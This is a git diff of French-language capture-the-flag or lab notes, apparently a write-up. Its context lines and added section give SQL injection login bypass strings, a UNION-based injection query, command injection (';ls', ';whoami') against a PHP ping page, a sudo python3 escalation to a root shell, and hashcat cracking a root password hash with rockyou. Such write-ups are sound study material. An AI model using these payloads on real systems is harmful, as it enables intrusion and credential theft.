@@ -3,7 +3,7 @@
 mettre " pour avoir une erreur
 
 
-* Solution:
+* Solution :
     Mettre en username : " OR 1=1 OR ""="
 
 Mais on est login en tant que "admin", pas l'autre user !
@@ -28,7 +28,7 @@ SELECT * FROM data.users WHERE username = "a" AND password="" UNION SELECT 1,pas
 
 # RCE PHP - Ping
 
-* Solution:
+* Solution :
     ;ls
     ;whoami
 
@@ -46,6 +46,18 @@ sudo -l
 User www-data may run the following commands on machine1:
     (root) NOPASSWD: /usr/bin/python3
 
-* Solution
+* Solution :
     sudo python3 -c "import os;os.system('whoami')"
     sudo python3 -c "import os;os.system('bash')"
+
+# Hash root
+ls ~
+pense_bete.txt
+
+cat ~/pense_bete.txt
+Pense-bête pour le mdp root de l'autre machine:
+dc15d3f5ab9656bc55f7a2f5d1e3a0a5
+
+* Solution :
+    hashcat -m0 -O flag /usr/share/wordlists/rockyou.txt
+    (hashcat -m0 --show flag)
